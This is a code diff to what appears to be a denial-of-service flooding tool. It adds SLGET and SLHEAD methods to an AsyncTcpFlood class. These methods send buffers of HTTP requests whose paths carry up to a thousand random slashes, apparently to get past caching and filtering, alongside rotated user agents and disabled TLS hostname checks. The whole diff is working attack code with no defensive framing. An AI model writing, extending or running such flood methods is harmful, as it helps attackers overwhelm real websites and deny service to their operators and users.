@@ -31,6 +31,7 @@ from .vendor.useragents import USERAGENTS
 
 USERAGENTS = list(USERAGENTS)
 REFERERS = list(set(a.strip() for a in REFERERS))
+RAND_SLASH = "{{RANDSLASH}}"
 
 ctx: SSLContext = create_default_context()
 ctx.check_hostname = False
@@ -230,6 +231,11 @@ class AsyncTcpFlood(FloodBase):
             path_qs += '?%s=%s' % (Tools.rand_str(6), Tools.rand_str(6))
         return path_qs
 
+    def add_rand_slash(self, path_qs) -> str:
+        while RAND_SLASH in path_qs:
+            path_qs = path_qs.replace(RAND_SLASH, "/"*random.randint(1, 1000), 1)
+        return parse.quote(path_qs)
+
     def build_request(self, path_qs=None, headers=None, body=None) -> bytes:
         path_qs = path_qs or self.default_path_qs
         headers = headers or self.default_headers()
@@ -265,7 +271,11 @@ class AsyncTcpFlood(FloodBase):
             loop=self._loop,
             on_close=on_close,
             settings=self._settings,
-            flood_spec=FloodSpec.from_any(payload_type, payload, self._settings.requests_per_connection),
+            flood_spec=FloodSpec.from_any(
+                payload_type,
+                payload,
+                self._settings.requests_per_connection
+            ),
             connections=self._connections,
             on_connect=on_connect,
         )
@@ -312,8 +322,21 @@ class AsyncTcpFlood(FloodBase):
         )
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
+    async def SLGET(self, on_connect=None) -> bool:
+        def payload() -> bytes:
+            return b''.join(self.build_request(
+                path_qs=self.add_rand_slash(self._url.path_qs)
+            ) for _ in range(self._settings.requests_per_buffer))
+
+        return await self._generic_flood_proto(
+            FloodSpecType.BUFFER,
+            (payload, self._settings.requests_per_buffer),
+            on_connect
+        )
+
     HEAD = GET
     RHEAD = RGET
+    SLHEAD = SLGET
 
     async def POST(self, on_connect=None) -> bool:
         def payload() -> bytes:
